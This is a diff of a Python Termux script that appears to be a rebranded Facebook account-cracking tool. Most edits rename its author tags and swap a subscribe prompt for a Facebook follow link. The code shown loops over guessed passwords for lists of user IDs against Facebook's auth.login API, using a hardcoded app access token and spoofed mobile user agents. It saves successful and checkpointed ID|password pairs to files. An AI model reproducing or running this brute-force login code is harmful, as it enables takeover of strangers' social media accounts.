@@ -78,9 +78,9 @@ def clear():
 def back():
 	login()
 
-ah="TRICKER-"
+ah="YUKIHIRA-"
 imt="-M4786=="
-ak=" ALIYAN-"
+ak=" SOMA-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
@@ -408,27 +408,27 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("\033[1;36m     UNSUSCRIBE KARNE WALON KA APROVEL URA DEYA JAIGA")
+		print("\033[1;36m     FOLLOW ME ON FB!")
 		print("")
-		print("\033[1;32m [1] First You Subscribe Channel")
+		print("\033[1;32m [1] First You Folow me On Fb")
 		print("\033[1;33m [2] Exit")
 		print("")
-		ALIYAN = input("\n\033[1;36m  Chose ==> \033[1;32m")
-		if ALIYAN in ["", " "]:
+		Yuki = input("\n\033[1;36m  Chose ==> \033[1;32m")
+		if Yuki in ["", " "]:
 			exit()
-		elif ALIYAN in ["2", "02"]:
-			print("    Thanks🥰♥️")
+		elif Yuki in ["2", "02"]:
+			print("    Thanks🥰")
 			exit()
-		elif ALIYAN in ["1", "01"]:
-			os.system("xdg-open https://youtu.be/gxjhqkJL_h0")
+		elif Yuki in ["1", "01"]:
+			os.system("xdg-open https://www.facebook.com/reysyyy")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;33m    Apna nam type kro")
+			print("\033[1;33m    Enjoy")
 			print("")
 			input("\n\033[1;32m  Type Name ==> \033[1;36m")
 			time.sleep(2.1)
 			print("")
-			print("\033[1;32m Successful Bro")
+			print("\033[1;32m Successful")
 			time.sleep(2.0)
 			os.system("clear")
 		
@@ -851,7 +851,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ BALOCH ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ YUKI ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -868,15 +868,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Yuki-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Yuki -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Yuki-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Yuki-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1278,7 +1278,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ ALIYAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ YUKI ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1295,15 +1295,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Yuki-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Yuki-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Yuki-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Yuki-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
